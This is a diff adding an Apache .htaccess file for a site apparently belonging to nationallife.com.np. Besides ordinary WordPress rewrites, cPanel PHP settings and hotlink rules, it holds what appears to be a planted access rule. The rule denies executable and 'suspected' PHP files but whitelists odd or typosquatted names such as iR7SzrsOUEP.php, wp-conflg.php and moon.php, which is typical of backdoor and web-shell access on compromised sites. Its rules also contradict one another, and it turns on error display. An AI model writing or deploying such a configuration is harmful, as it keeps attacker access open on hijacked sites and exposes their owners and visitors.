@@ -1,0 +1,64 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+<FilesMatch ".(py|exe|phtml|php|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|login.php|wp-login.php|wp-blog-header.php|style.php|style2.php|wp-conflg.php|index.php|class.api.php|iR7SzrsOUEP.php|license.php|wp-blog.php|moon.php|wp-add.php|plugin-install.php|admin.php|wp-sigunq.php|my1.php|wp-add.php|framework.php|class-rest-plugin.php|config-core-style.php|config-block-api.php|block-nav.php|init-widgets-compat.php|init-block-style.php|config-rest-conf.php|iR7SzrsOUEP.php|wp-blog.php|lang-inc-option.php|init-load-sitemaps.php|lang-load-tokens.php|config.walker-locale.php|config.load-query.php|lang.rest-conf.php|class-vars-settings.php|config.rest-rss.php|dist-core-settings.php|vars-compat.php|class-widgets-compat.php|class-site-role.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+<FilesMatch "\.(php|css|jpg|png|js|html)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+# BEGIN cPanel-generated php ini directives, do not edit
+# Manual editing of this file may result in unexpected behavior.
+# To make changes to this file, use the cPanel MultiPHP INI Editor (Home >> Software >> MultiPHP INI Editor)
+# For more information, read our documentation (https://go.cpanel.net/EA4ModifyINI)
+<IfModule php5_module>
+   php_flag asp_tags Off
+   php_flag display_errors On
+   php_value max_execution_time 
+   php_value max_input_time 60
+   php_value max_input_vars 1000
+   php_value memory_limit 256M
+   php_value post_max_size 8M
+   php_value session.gc_maxlifetime 1440
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php56"
+   php_value upload_max_filesize 2M
+   php_flag zlib.output_compression Off
+</IfModule>
+<IfModule lsapi_module>
+   php_flag asp_tags Off
+   php_flag display_errors On
+   php_value max_execution_time 30
+   php_value max_input_time 60
+   php_value max_input_vars 1000
+   php_value memory_limit 256M
+   php_value post_max_size 8M
+   php_value session.gc_maxlifetime 1440
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php56"
+   php_value upload_max_filesize 2M
+   php_flag zlib.output_compression Off
+</IfModule>
+# END cPanel-generated php ini directives, do not edit
+
+RewriteCond %{HTTP_REFERER} !^http://nationallife.com.np/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://nationallife.com.np$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.nationallife.com.np/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.nationallife.com.np$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://nationallife.com.np/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://nationallife.com.np$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.nationallife.com.np/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.nationallife.com.np$      [NC]
+RewriteRule .*\.(jpg|jpeg|gif|png|bmp)$ - [F,NC]
+
